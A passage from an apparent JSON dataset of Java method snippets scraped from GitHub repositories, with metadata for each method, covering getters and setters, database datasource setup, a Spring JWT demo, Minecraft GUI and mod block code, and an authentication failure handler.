"return_type": "void", "snippet": "    public void setHomeUrl(String homeUrl) {        this.homeUrl = homeUrl;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/UserDomain.java", "stars": "2", "class": {"name": "UserDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getScreenName", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getScreenName() {        return screenName;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/UserDomain.java", "stars": "2", "class": {"name": "UserDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setScreenName", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setScreenName(String screenName) {        this.screenName = screenName;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/UserDomain.java", "stars": "2", "class": {"name": "UserDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCreated", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getCreated() {        return created;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/UserDomain.java", "stars": "2", "class": {"name": "UserDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setCreated", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCreated(Integer created) {        this.created = created;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/UserDomain.java", "stars": "2", "class": {"name": "UserDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getActivated", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getActivated() {        return activated;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/UserDomain.java", "stars": "2", "class": {"name": "UserDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setActivated", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setActivated(Integer activated) {        this.activated = activated;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/UserDomain.java", "stars": "2", "class": {"name": "UserDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getLogged", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getLogged() {        return logged;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/UserDomain.java", "stars": "2", "class": {"name": "UserDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setLogged", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setLogged(Integer logged) {        this.logged = logged;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/UserDomain.java", "stars": "2", "class": {"name": "UserDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getGroupName", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getGroupName() {        return groupName;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/UserDomain.java", "stars": "2", "class": {"name": "UserDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setGroupName", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setGroupName(String groupName) {        this.groupName = groupName;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/UserDomain.java", "stars": "2", "class": {"name": "UserDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getDataSource", "params": ["Props"], "throws": null, "modifiers": ["public", "static"], "return_type": "AzkabanDataSource", "snippet": "  public static AzkabanDataSource getDataSource(final Props props) {    final String databaseType = props.getString(\"database.type\");    AzkabanDataSource dataSource = null;    if (databaseType.equals(\"mysql\")) {      final int port = props.getInt(\"mysql.port\");      final String host = props.getString(\"mysql.host\");      final String database = props.getString(\"mysql.database\");      final String user = props.getString(\"mysql.user\");      final int numConnections = props.getInt(\"mysql.numconnections\");      String pwd = null;      try {        pwd = new String(Base64.getDecoder().decode(props.getString(\"mysql.password\").getBytes()),\"UTF-8\");      } catch (Exception e){        logger.error(\"password decore failed\" + e);      }      final String password = pwd;      dataSource =          getMySQLDataSource(host, port, database, user, password,              numConnections);    } else if (databaseType.equals(\"h2\")) {      final String path = props.getString(\"h2.path\");      final Path h2DbPath = Paths.get(path).toAbsolutePath();      logger.info(\"h2 DB path: \" + h2DbPath);      dataSource = getH2DataSource(h2DbPath);    }    return dataSource;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/database/DataSourceUtils.java", "stars": "18", "class": {"name": "DataSourceUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getMySQLDataSource", "params": ["String", "Integer", "String", "String", "String", "Integer"], "throws": null, "modifiers": ["public", "static"], "return_type": "AzkabanDataSource", "snippet": "  public static AzkabanDataSource getMySQLDataSource(final String host, final Integer port,      final String dbName, final String user, final String password, final Integer numConnections) {    return new MySQLBasicDataSource(host, port, dbName, user, password,        numConnections);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/database/DataSourceUtils.java", "stars": "18", "class": {"name": "DataSourceUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getH2DataSource", "params": ["Path"], "throws": null, "modifiers": ["public", "static"], "return_type": "AzkabanDataSource", "snippet": "  public static AzkabanDataSource getH2DataSource(final Path file) {    return new EmbeddedH2BasicDataSource(file);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/database/DataSourceUtils.java", "stars": "18", "class": {"name": "DataSourceUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "allowsOnDuplicateKey", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean allowsOnDuplicateKey() {      return true;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/database/DataSourceUtils.java", "stars": "18", "class": {"name": "MySQLBasicDataSource", "extends": "AzkabanDataSource", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getDBType", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getDBType() {      return \"mysql\";    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/database/DataSourceUtils.java", "stars": "18", "class": {"name": "MySQLBasicDataSource", "extends": "AzkabanDataSource", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "allowsOnDuplicateKey", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean allowsOnDuplicateKey() {      return false;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/database/DataSourceUtils.java", "stars": "18", "class": {"name": "EmbeddedH2BasicDataSource", "extends": "AzkabanDataSource", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getDBType", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getDBType() {      return \"h2\";    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/database/DataSourceUtils.java", "stars": "18", "class": {"name": "EmbeddedH2BasicDataSource", "extends": "AzkabanDataSource", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "destroy", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void destroy() throws Exception {        for (AppInitializer txLcnInitializer : initializers) {            txLcnInitializer.destroy();        }    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/core/runner/ApplicationRunnerInit.java", "stars": "1", "class": {"name": "ApplicationRunnerInit", "extends": null, "implements": ["ApplicationRunner", "DisposableBean"], "modifiers": ["public"]}}, {"method_name": "run", "params": ["ApplicationArguments"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void run(ApplicationArguments args) throws Exception {        Map<String, AppInitializer> runnerMap = applicationContext.getBeansOfType(AppInitializer.class);        //\u597d\u5904 \u5728\u4e8e\u53ef\u4ee5\u6839\u636e order\u8fdb\u884c\u6392\u5e8f \u6267\u884c\u5faa\u5e8f\u5f88\u597d\u7684\u63a7\u5236        initializers = runnerMap.values().stream().sorted(Comparator.comparing(AppInitializer::order))                .collect(Collectors.toList());        for (AppInitializer txLcnInitializer : initializers) {            txLcnInitializer.init();        }    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/core/runner/ApplicationRunnerInit.java", "stars": "1", "class": {"name": "ApplicationRunnerInit", "extends": null, "implements": ["ApplicationRunner", "DisposableBean"], "modifiers": ["public"]}}, {"method_name": "init", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void init() {        components.forEach(Component::init);    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/frame/Frame.java", "stars": "12", "class": {"name": "Frame", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "moved", "params": ["float", "float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void moved(float x, float y) {        this.x = x;        this.y = y;        components.forEach(component -> component.moved(x, y));    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/frame/Frame.java", "stars": "12", "class": {"name": "Frame", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "drawScreen", "params": ["int", "int", "float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void drawScreen(int mx, int my, float partialTicks) {        if (isDragging()) {            setX(mx + getLastx());            setY(my + getLasty());            moved(getX(), getY());        }        if (getX() < 0) {            setX(0);            moved(getX(), getY());        }        if (getX() + getW() > new ScaledResolution(Minecraft.getMinecraft()).getScaledWidth()) {            setX(new ScaledResolution(Minecraft.getMinecraft()).getScaledWidth() - getW());            moved(getX(), getY());        }        if (getY() < 0) {            setY(0);            moved(getX(), getY());        }        if (getY() + getH() > new ScaledResolution(Minecraft.getMinecraft()).getScaledHeight()) {            setY(new ScaledResolution(Minecraft.getMinecraft()).getScaledHeight() - getH());            moved(getX(), getY());        }        if (isExtended())            components.forEach(component -> component.drawScreen(mx, my, partialTicks));    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/frame/Frame.java", "stars": "12", "class": {"name": "Frame", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "mouseClicked", "params": ["int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void mouseClicked(int mx, int my, int button) {        final boolean hovered = MouseUtil.withinBounds(mx, my, getX(), getY(), getW(), getH());        switch (button) {            case 0:                if (hovered) {                    setDragging(true);                    setLastx(getX() - mx);                    setLasty(getY() - my);                }                break;            case 1:                if (hovered)                    setExtended(!isExtended());                break;            default:                break;        }        if (isExtended())            components.forEach(component -> component.mouseClicked(mx, my, button));    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/frame/Frame.java", "stars": "12", "class": {"name": "Frame", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "mouseReleased", "params": ["int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void mouseReleased(int mx, int my, int button) {        switch (button) {            case 0:                if (isDragging()) {                    setDragging(false);                }                break;            default:                break;        }        if (isExtended())            components.forEach(component -> component.mouseReleased(mx, my, button));    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/frame/Frame.java", "stars": "12", "class": {"name": "Frame", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onGuiClosed", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onGuiClosed() {        components.forEach(component -> component.onGuiClosed());    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/frame/Frame.java", "stars": "12", "class": {"name": "Frame", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "keyTyped", "params": ["char", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void keyTyped(char character, int key) {        if (isExtended())            components.forEach(component -> component.keyTyped(character, key));    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/frame/Frame.java", "stars": "12", "class": {"name": "Frame", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getX", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float getX() {        return x;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/frame/Frame.java", "stars": "12", "class": {"name": "Frame", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setX", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setX(float x) {        this.x = x;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/frame/Frame.java", "stars": "12", "class": {"name": "Frame", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getY", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float getY() {        return y;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/frame/Frame.java", "stars": "12", "class": {"name": "Frame", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setY", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setY(float y) {        this.y = y;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/frame/Frame.java", "stars": "12", "class": {"name": "Frame", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getW", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float getW() {        return w;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/frame/Frame.java", "stars": "12", "class": {"name": "Frame", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setW", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setW(float w) {        this.w = w;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/frame/Frame.java", "stars": "12", "class": {"name": "Frame", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getH", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float getH() {        return h;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/frame/Frame.java", "stars": "12", "class": {"name": "Frame", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setH", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setH(float h) {        this.h = h;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/frame/Frame.java", "stars": "12", "class": {"name": "Frame", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getLabel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getLabel() {        return label;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/frame/Frame.java", "stars": "12", "class": {"name": "Frame", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setLabel", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setLabel(String label) {        this.label = label;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/frame/Frame.java", "stars": "12", "class": {"name": "Frame", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "isDragging", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isDragging() {        return dragging;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/frame/Frame.java", "stars": "12", "class": {"name": "Frame", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setDragging", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDragging(boolean dragging) {        this.dragging = dragging;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/frame/Frame.java", "stars": "12", "class": {"name": "Frame", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "isExtended", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isExtended() {        return extended;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/frame/Frame.java", "stars": "12", "class": {"name": "Frame", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setExtended", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setExtended(boolean extended) {        this.extended = extended;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/frame/Frame.java", "stars": "12", "class": {"name": "Frame", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getLastx", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float getLastx() {        return lastx;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/frame/Frame.java", "stars": "12", "class": {"name": "Frame", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setLastx", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setLastx(float lastx) {        this.lastx = lastx;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/frame/Frame.java", "stars": "12", "class": {"name": "Frame", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getLasty", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float getLasty() {        return lasty;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/frame/Frame.java", "stars": "12", "class": {"name": "Frame", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setLasty", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setLasty(float lasty) {        this.lasty = lasty;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/frame/Frame.java", "stars": "12", "class": {"name": "Frame", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getComponents", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ArrayList<Component>", "snippet": "    public ArrayList<Component> getComponents() {        return components;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/client/gui/click/panel/panels/modules/frame/Frame.java", "stars": "12", "class": {"name": "Frame", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\t\tSpringApplication.run(JwtApplication.class, args);\t}", "url": "https://raw.githubusercontent.com/joshlong/security-jwt-fun/master/jwt-servlet/src/main/java/com/example/jwt/JwtApplication.java", "stars": "4", "class": {"name": "JwtApplication", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "authentication", "params": [], "throws": null, "modifiers": [], "return_type": "InMemoryUserDetailsManager", "snippet": "\tInMemoryUserDetailsManager authentication() {\t\tUserDetails one = User.withDefaultPasswordEncoder().username(\"client1\").password(\"pw\").roles(\"USER\").build();\t\tUserDetails two = User.withDefaultPasswordEncoder().username(\"client2\").password(\"pw\").roles(\"USER\").build();\t\treturn new InMemoryUserDetailsManager(one, two);\t}", "url": "https://raw.githubusercontent.com/joshlong/security-jwt-fun/master/jwt-servlet/src/main/java/com/example/jwt/JwtApplication.java", "stars": "4", "class": {"name": "JwtApplication", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "configure", "params": ["HttpSecurity"], "throws": ["Exception"], "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void configure(HttpSecurity http) throws Exception {\t\thttp//\t\t\t\t.cors(Customizer.withDefaults())//\t\t\t\t.csrf(AbstractHttpConfigurer::disable)//\t\t\t\t.sessionManagement(sm -> sm.sessionCreationPolicy(SessionCreationPolicy.STATELESS));\t}", "url": "https://raw.githubusercontent.com/joshlong/security-jwt-fun/master/jwt-servlet/src/main/java/com/example/jwt/JwtApplication.java", "stars": "4", "class": {"name": "MySecurityConfiguration", "extends": "WebSecurityConfigurerAdapter", "implements": null, "modifiers": []}}, {"method_name": "greet", "params": ["Principal"], "throws": null, "modifiers": [], "return_type": "Map<String,String>", "snippet": "\tMap<String, String> greet(@AuthenticationPrincipal Principal principal) {\t\treturn Map.of(\"greetings\", \"hello \" + principal.getName() + \"!\");\t}", "url": "https://raw.githubusercontent.com/joshlong/security-jwt-fun/master/jwt-servlet/src/main/java/com/example/jwt/JwtApplication.java", "stars": "4", "class": {"name": "GreetingsRestController", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "onFailure", "params": ["HttpServletRequest", "HttpServletResponse", "BaseException"], "throws": ["IOException", "ServletException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void onFailure(HttpServletRequest request, HttpServletResponse response, BaseException exception) throws IOException, ServletException {        log.error(\"Authentication failure {}\", exception.getMessage());        BaseResponse<Object> error = new BaseResponse<>();        error.setStatus(exception.getStatus().value());        error.setMessage(exception.getMessage());        error.setData(exception.getErrorData());        response.setStatus(error.getStatus());        response.setContentType(MediaType.APPLICATION_JSON_UTF8_VALUE);        response.getWriter().write(new ObjectMapper().writeValueAsString(error));    }", "url": "https://raw.githubusercontent.com/rubywooJ/beyond/master/src/main/java/cn/tsxygfy/beyond/security/handler/DefaultAuthenticationFailureHandler.java", "stars": "1", "class": {"name": "DefaultAuthenticationFailureHandler", "extends": null, "implements": ["AuthenticationFailureHandler"], "modifiers": ["public"]}}, {"method_name": "initElements", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void initElements() {\t\telements.blocks.add(() -> new CustomBlock());\t\telements.items.add(() -> new BlockItem(block, new Item.Properties().group(ItemGroup.DECORATIONS)).setRegistryName(block.getRegistryName()));\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/CharredNetherBrickWallBlock.java", "stars": "2", "class": {"name": "CharredNetherBrickWallBlock", "extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"method_name": "clientLoad", "params": ["FMLClientSetupEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void clientLoad(FMLClientSetupEvent event) {\t\tRenderTypeLookup.setRenderLayer(block, RenderType.getCutout());\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/CharredNetherBrickWallBlock.java", "stars": "2", "class": {"name": "CharredNetherBrickWallBlock", "extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"method_name": "func_220113_a", "params": ["BlockState", "boolean", "Direction"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "\t\tprivate boolean func_220113_a(BlockState state, boolean checkattach, Direction face) {\t\t\tboolean flag = state.getBlock() instanceof WallBlock\t\t\t\t\t|| state.getBlock() instanceof FenceGateBlock && FenceGateBlock.isParallel(state, face);\t\t\treturn !cannotAttach(state.getBlock()) && checkattach || flag;\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/CharredNetherBrickWallBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "WallBlock", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getStateForPlacement", "params": ["BlockItemUseContext"], "throws": null, "modifiers": ["public"], "return_type": "BlockState", "snippet": "\t\tpublic BlockState getStateForPlacement(BlockItemUseContext context) {\t\t\tIWorldReader iworldreader = context.getWorld();\t\t\tBlockPos blockpos = context.getPos();\t\t\tIFluidState ifluidstate = context.getWorld().getFluidState(context.getPos());\t\t\tBlockPos blockpos1 = blockpos.north();\t\t\tBlockPos blockpos2 = blockpos.east();\t\t\tBlockPos blockpos3 = blockpos.south();\t\t\tBlockPos blockpos4 = blockpos.west();\t\t\tBlockState blockstate = iworldreader.getBlockState(blockpos1);\t\t\tBlockState blockstate1 = iworldreader.getBlockState(blockpos2);\t\t\tBlockState blockstate2 = iworldreader.getBlockState(blockpos3);\t\t\tBlockState blockstate3 = iworldreader.getBlockState(blockpos4);\t\t\tboolean flag = this.func_220113_a(blockstate, blockstate.isSolidSide(iworldreader, blockpos1, Direction.SOUTH), Direction.SOUTH);\t\t\tboolean flag1 = this.func_220113_a(blockstate1, blockstate1.isSolidSide(iworldreader, blockpos2, Direction.WEST), Direction.WEST);\t\t\tboolean flag2 = this.func_220113_a(blockstate2, blockstate2.isSolidSide(iworldreader, blockpos3, Direction.NORTH), Direction.NORTH);\t\t\tboolean flag3 = this.func_220113_a(blockstate3, blockstate3.isSolidSide(iworldreader, blockpos4, Direction.EAST), Direction.EAST);\t\t\tboolean flag4 = (!flag || flag1 || !flag2 || flag3) && (flag || !flag1 || flag2 || !flag3);\t\t\treturn this.getDefaultState().with(UP, Boolean.valueOf(flag4 || !iworldreader.isAirBlock(blockpos.up())))\t\t\t\t\t.with(NORTH, Boolean.valueOf(flag)).with(EAST, Boolean.valueOf(flag1)).with(SOUTH, Boolean.valueOf(flag2))\t\t\t\t\t.with(WEST, Boolean.valueOf(flag3)).with(WATERLOGGED, Boolean.valueOf(ifluidstate.getFluid() == Fluids.WATER));\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/CharredNetherBrickWallBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "WallBlock", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "updatePostPlacement", "params": ["BlockState", "Direction", "BlockState", "IWorld", "BlockPos", "BlockPos"], "throws": null, "modifiers": ["public"], "return_type": "BlockState", "snippet": "\t\tpublic BlockState updatePostPlacement(BlockState stateIn, Direction facing, BlockState facingState, IWorld worldIn, BlockPos currentPos,\t\t\t\tBlockPos facingPos) {\t\t\tif (stateIn.get(WATERLOGGED)) {\t\t\t\tworldIn.getPendingFluidTicks().scheduleTick(currentPos, Fluids.WATER, Fluids.WATER.getTickRate(worldIn));\t\t\t}\t\t\tif (facing == Direction.DOWN) {\t\t\t\treturn super.updatePostPlacement(stateIn, facing, facingState, worldIn, currentPos, facingPos);\t\t\t} else {\t\t\t\tDirection direction = facing.getOpposite();\t\t\t\tboolean flag = facing == Direction.NORTH\t\t\t\t\t\t? this.func_220113_a(facingState, facingState.isSolidSide(worldIn, facingPos, direction), direction)\t\t\t\t\t\t: stateIn.get(NORTH);\t\t\t\tboolean flag1 = facing == Direction.EAST\t\t\t\t\t\t? this.func_220113_a(facingState, facingState.isSolidSide(worldIn, facingPos, direction), direction)\t\t\t\t\t\t: stateIn.get(EAST);\t\t\t\tboolean flag2 = facing == Direction.SOUTH\t\t\t\t\t\t? this.func_220113_a(facingState, facingState.isSolidSide(worldIn, facingPos, direction), direction)\t\t\t\t\t\t: stateIn.get(SOUTH);\t\t\t\tboolean flag3 = facing == Direction.WEST\t\t\t\t\t\t? this.func_220113_a(facingState, facingState.isSolidSide(worldIn, facingPos, direction), direction)\t\t\t\t\t\t: stateIn.get(WEST);\t\t\t\tboolean flag4 = (!flag || flag1 || !flag2 || flag3) && (flag || !flag1 || flag2 || !flag3);\t\t\t\treturn stateIn.with(UP, Boolean.valueOf(flag4 || !worldIn.isAirBlock(currentPos.up()))).with(NORTH, Boolean.valueOf(flag))\t\t\t\t\t\t.with(EAST, Boolean.valueOf(flag1)).with(SOUTH, Boolean.valueOf(flag2)).with(WEST, Boolean.valueOf(flag3));\t\t\t}\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/CharredNetherBrickWallBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "WallBlock", "implements": 